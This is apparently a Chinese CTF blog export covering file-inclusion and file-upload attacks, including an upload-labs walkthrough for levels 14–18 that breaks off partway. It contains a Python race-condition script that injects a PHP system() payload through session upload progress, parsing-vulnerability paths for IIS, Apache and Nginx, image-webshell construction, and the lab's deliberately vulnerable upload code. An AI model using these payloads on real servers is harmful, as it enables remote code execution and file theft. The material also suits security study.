<h3 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a>session.upload_progress</h3><p><a href="https://www.freebuf.com/news/202819.html">利用session.upload_progress进行文件包含</a></p>
<p><a href="https://ctf.show/">CTFSHOW</a></p>
<p><code>sess_flag</code></p>
<p><img src="C:/Users/13611/Desktop/nep冬令营/讲课/深入一些吧.assets/4.png" alt="4"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessID = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;url&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">256</span> * <span class="number">1</span>) <span class="comment">#建议正常这个填充数据大一点</span></span><br><span class="line">        response = session.post(</span><br><span class="line">            url,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessID&#125;,</span><br><span class="line">            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;cat ../f*&quot;);?&gt;&#x27;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;a.txt&#x27;</span>, f)&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(url+<span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">write = threading.Thread(target=write, args=(session,))</span><br><span class="line">write.daemon = <span class="literal">True</span> <span class="comment">#当daemon为True时，父线程在运行完毕后，子线程无论是否正在运行，都会伴随主线程一起退出。</span></span><br><span class="line">write.start()</span><br><span class="line">read()</span><br></pre></td></tr></table></figure>
<h3 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h3><p>Windows下目录最大长度为256字节，超出的部分会被丢弃；</p>
<p>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p>
<p>那么在长度有限的时候，<code>././././</code> (n个) 的形式就可以通过这个把路径爆掉</p>
<p>在php代码包含中，这种绕过方式要求php版本 &lt; php 5.2.8</p>
<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="一-IIS5-x-6-x解析漏洞"><a href="#一-IIS5-x-6-x解析漏洞" class="headerlink" title="(一)IIS5.x-6.x解析漏洞"></a>(一)IIS5.x-6.x解析漏洞</h3><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp;该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p>
<p>目录解析(6.0)<br>形式：www.xxx.com/xx.asp/xx.jpg<br>原理: 服务器默认会把.asp，.asp目录下的文件都解析成asp文件。（传个图片马）</p>
<p>文件解析<br>形式：www.xxx.com/xx.asp;.jpg（文件名）<br>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。<br>解析文件类型</p>
<p>IIS6.0 默认的可执行文件除了asp还包含这三种 :<br>/test.asa<br>/test.cer<br>/test.cdx</p>
<h4 id="Iis7-5解析漏洞-php-ini开启fix-pathinfo"><a href="#Iis7-5解析漏洞-php-ini开启fix-pathinfo" class="headerlink" title="Iis7.5解析漏洞(php.ini开启fix_pathinfo)"></a>Iis7.5解析漏洞(php.ini开启fix_pathinfo)</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.php --&gt; &#x2F;xx.jpg         &#x2F;&#x2F;上传.jpg一句话，访问时后面加上&#x2F;xx.php </span><br></pre></td></tr></table></figure>
<h3 id="二-apache解析漏洞"><a href="#二-apache解析漏洞" class="headerlink" title="(二)apache解析漏洞"></a>(二)apache解析漏洞</h3><p>PHP 5.2 00存在截断上传（0x00）(%00)<br>PHP 5.3之后就没有了该漏洞</p>
<p>漏洞原理<br>Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如test.php.qwe.asd “.qwe”和”.asd” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.qwe.asd解析成php。</p>
<p>漏洞形式<br>www.xxxx.xxx.com/test.php.php123<br>其余配置问题导致漏洞</p>
<p>(1)如果在 Apache 的 conf 里有这样一行配置 </p>
<p>AddHandler php5-script .php</p>
<p> 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>(2)如果在 Apache 的 conf 里有这样一行配置 </p>
<p>AddType application/x-httpd-php .jpg </p>
<p>即使扩展名是 jpg，一样能以php 方式执行。（htaccess文件上传解析漏洞，可以将这段代码写到.htaccess中，再上传写有php一句话代码的jpg文件中）</p>
<h3 id="三-nginx解析漏洞"><a href="#三-nginx解析漏洞" class="headerlink" title="(三)nginx解析漏洞"></a>(三)nginx解析漏洞</h3><p>漏洞原理<br>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为 “phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：<br>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
<p>漏洞形式<br>www.xxxx.com/UploadFiles/image/1.jpg/1.php<br>www.xxxx.com/UploadFiles/image/1.jpg%00.php<br>www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</p>
<p>另外一种手法：上传一个名字为test.jpg，然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。</p>
<p>nginx解析漏洞(php.ini开启fix_pathinfo)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.php --&gt; xxx.jpg%00.php      &#x2F;&#x2F;Nginx &lt;8.03 空字节代码执行漏洞</span><br></pre></td></tr></table></figure>
<h3 id="四-IIS7-5解析漏洞"><a href="#四-IIS7-5解析漏洞" class="headerlink" title="(四)IIS7.5解析漏洞"></a>(四)IIS7.5解析漏洞</h3><p>IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs学习下篇</title>
    <url>/2021/04/24/upload-labs%E5%AD%A6%E4%B9%A0%E4%B8%8B%E7%AF%87/</url>
    <content><![CDATA[<h1 id="upload-labs靶场训练篇（windows版21题）14-21题"><a href="#upload-labs靶场训练篇（windows版21题）14-21题" class="headerlink" title="upload-labs靶场训练篇（windows版21题）14-21题"></a>upload-labs靶场训练篇（windows版21题）14-21题</h1><p>upload-labs为文件上传的训练靶场，目前一共有21关，基本涵盖了目前全部的文件上传漏洞。此篇为下篇。</p>
<span id="more"></span>
<h2 id="level-14-图片马之文件头检测"><a href="#level-14-图片马之文件头检测" class="headerlink" title="level-14(图片马之文件头检测)"></a>level-14(图片马之文件头检测)</h2><h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = getReailFileType(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答:"></a>解答:</h3><p>图片马</p>
<p>拓展一下如何制作图片马：</p>
<p>思路：上传图片马，制作：<code>copy x.jpg/b + x.php/a xx.jpg</code>，上传后需要结合文件包含漏洞利用，或者目标服务器支持以php解析.jpg后缀，这里需要注意的是图片马中的一句话能写到中间尽量写到中间，真实环境不容易被发现，可用winhex或bp修改<br>copy使用注意事项：图片一定要在copy后面，否则创建出来的木马图片有可能无法显示，例如，<code>copy x.php/a + x.gif/b xx.gif</code>，xx.gif就无法显示。</p>
<p>本题上传图片马后，利用作者留下的include.php来验证。</p>
<p>payload:<code>include.php?file=upload/xx.gif</code></p>
<p>执行<code>phpinfo();</code>成功</p>
<h2 id="level-15"><a href="#level-15" class="headerlink" title="level-15"></a>level-15</h2><h3 id="源码：-1"><a href="#源码：-1" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = getimagesize(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = image_type_to_extension(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = isImage(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h3><p>本题检验文件头，采用:<code>GIF89a</code>来绕过，详细步骤与上题一样。</p>
<p>拓展图片文件头：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JPEG (jpg)，文件头hex：FF D8 FF</span><br><span class="line">PNG (png)，文件头hex：89 50 4E 47</span><br><span class="line">GIF (gif)，文件头hex：47 49 46 38（也就是GIF89a）</span><br></pre></td></tr></table></figure>
<h2 id="level-16"><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = exif_imagetype(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = isImage(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h3><p>与14和15的方法一样。需要环境：PHP版本大于5.2.10，且开启php_exif扩展</p>
<h2 id="level-17"><a href="#level-17" class="headerlink" title="level-17"></a>level-17</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= substr(strrchr(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromjpeg(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagejpeg(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefrompng(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagepng(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromgif(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagegif(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h3><p>二次渲染，传gif。具体上传方式会在总结的笔记中详细记录</p>
<h2 id="level-18"><a href="#level-18" class="headerlink" title="level-18"></a>level-18</h2><h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$file_name</span>,strrpos(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             rename(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答:"></a>解答:</h3><p>审计代码发现：rename修改名称，unlink删除文件，我们在他删除之前再次上传，使用条件竞争</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531501842-3c5c9dc6-00f1-4f53-83d6-30f9ebe01a0a.png" alt="image-20210426201242962"></p>
<p>发送到爆破，修改一下参数：</p>
